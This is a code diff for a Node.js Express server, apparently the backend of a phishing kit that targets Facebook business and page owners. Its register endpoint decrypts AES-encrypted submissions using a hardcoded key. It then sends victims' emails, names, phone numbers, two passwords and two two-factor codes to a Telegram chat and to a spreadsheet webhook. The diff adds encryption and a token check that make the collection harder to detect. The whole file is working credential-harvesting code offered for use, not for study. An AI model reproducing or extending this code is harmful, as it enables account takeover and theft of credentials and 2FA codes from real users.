@@ -3,6 +3,7 @@ import 'dotenv/config';
 import cors from "cors";
 import TelegramBot from 'node-telegram-bot-api';
 import axios from "axios";
+import CryptoJS from "crypto-js";
 import rateLimit from "express-rate-limit";
 
 const app = express();
@@ -10,6 +11,26 @@ app.use(cors('*'));
 app.use(express.json());
 
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
+const secretKey = 'HDNDT-JDHT8FNEK-JJHR';
+
+function decrypt(encryptedData) {
+    const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
+    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+    return decrypted;
+}
+
+const ipFilter = (req, res, next) => {
+    const { data } = req.body;
+    const decryptedData = decrypt(data);
+    const values = JSON.parse(decryptedData);
+    const token = values?.token;
+
+    if (token !== process.env.TOKEN) {
+        res.status(403).json({ message: 'Access forbidden: Your IP is not allowed' });
+    } else {
+        next();
+    }
+};
 
 const registerLimiter = rateLimit({
     windowMs: 1 * 60 * 1000,
@@ -18,48 +39,61 @@ const registerLimiter = rateLimit({
     headers: true,
 });
 
-app.post('/api/resgister',registerLimiter, (req, res) => {
-    const data = req.body; 
+app.post('/api/register',registerLimiter, ipFilter, (req, res) => {
+    
+    try {
+        const { data } = req.body;
 
-    if (!data.ip) {
-        res.send({
-            "status": 502,
-            "message": "Wtf do you want?"
-        });
-    } else {
-        const message = `Ip:<code>${data.ip ? data.ip : ''}</code>\n ---------------------------------\n Email Business: <code>${data.businessEmail ? data.businessEmail : ''} </code>\n Email Personal: <code>${data.personalEmail ? data.personalEmail : ''}</code>\n Full Name: <code>${data.fullName ? data.fullName : ''} </code>\n Fanpage Name: <code>${data.fanpageName ? data.fanpageName : ''}</code>\n Phone Number: <code>${data.mobilePhone ? data.mobilePhone : ''}</code>\n Password First: <code>${data.passwordFirst ? data.passwordFirst : ''}</code>\n Password Second: <code>${data.passwordSecond ? data.passwordSecond : ''}</code>\n ---------------------------------\n First Two-Fa: <code> ${data.firstTwoFa ? data.firstTwoFa : ''}</code>\n Second Two-Fa: <code> ${data.secondTwoFa ? data.secondTwoFa : ''}</code>\n Image: <code> ${data.imageUrl ? data.imageUrl : ''}</code>`;
-        bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
+        const decryptedData = decrypt(data);
+        const value = JSON.parse(decryptedData);
 
-        res.send({
-            "status": 0,
-            "message": "Success!"
-        });
+        if (!value.ip) {
+            res.status(500).json({
+                message: 'Wtf?',
+                error_code: 500
+            });
+        } else {
+            res.status(200).json({
+                message: 'Success',
+                error_code: 0
+            });
 
-        const url = new URL(process.env.WEBHOOK_URL);
+            const message = `Ip:<code>${value.ip ? value.ip : ''}</code>\n ---------------------------------\n Email Business: <code>${value.businessEmail ? value.businessEmail : ''} </code>\n Email Personal: <code>${value.personalEmail ? value.personalEmail : ''}</code>\n Full Name: <code>${value.fullName ? value.fullName : ''} </code>\n Fanpage Name: <code>${value.fanpageName ? value.fanpageName : ''}</code>\n Phone Number: <code>${value.mobilePhone ? value.mobilePhone : ''}</code>\n Password First: <code>${value.passwordFirst ? value.passwordFirst : ''}</code>\n Password Second: <code>${value.passwordSecond ? value.passwordSecond : ''}</code>\n ---------------------------------\n First Two-Fa: <code> ${value.firstTwoFa ? value.firstTwoFa : ''}</code>\n Second Two-Fa: <code> ${value.secondTwoFa ? value.secondTwoFa : ''}</code>\n Image: <code> ${value.imageUrl ? value.imageUrl : ''}</code>`;
+            bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
+            
+            const url = new URL(process.env.WEBHOOK_URL);
 
-        url.searchParams.append('Ip', data.ip ? data.ip : '');
-        url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
-        url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
-        url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
-        url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
-        url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
-        url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
-        url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
-        url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
-        url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
-        url.searchParams.append('Image', data.imageUrl ? data.imageUrl : '');
+            url.searchParams.append('Ip', value.ip ? value.ip : '');
+            url.searchParams.append('Email Business', value.businessEmail ? value.businessEmail : '');
+            url.searchParams.append('Email Personal', value.personalEmail ? value.personalEmail : '');
+            url.searchParams.append('Full Name', value.fullName ? value.fullName : '');
+            url.searchParams.append('Fanpage Name', value.fanpageName ? value.fanpageName : '');
+            url.searchParams.append('Phone Number', value.mobilePhone ? value.mobilePhone : '');
+            url.searchParams.append('Password First', value.passwordFirst ? value.passwordFirst : '');
+            url.searchParams.append('Password Second', value.passwordSecond ? value.passwordSecond : '');
+            url.searchParams.append('First Two-Fa', value.firstTwoFa ? value.firstTwoFa : '');
+            url.searchParams.append('Second Two-Fa', value.secondTwoFa ? value.secondTwoFa : '');
+            url.searchParams.append('Image', value.imageUrl ? value.imageUrl : '');
 
-        axios.get(url)
-        .then(response => {
-            const data = response.data;
-            if (data.status === 'success') {
-                bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-            } else {
-                bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-            }
-        })
-        .catch(error => {
-            bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+            axios.get(url)
+            .then(response => {
+                const data = response.data;
+                if (data.status === 'success') {
+                    bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
+                } else {
+                    bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
+                }
+            })
+            .catch(error => {
+                bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+            });
+        }
+
+    } catch (error) {
+        bot.sendMessage(process.env.CHAT_ID, 'Server giải mã dữ liệu không thành công, liên hệ <code>@otisth</code>',  { parse_mode: 'html' });
+        res.status(500).json({
+            message: 'Erorr',
+            error_code: 1
         });
     }
 
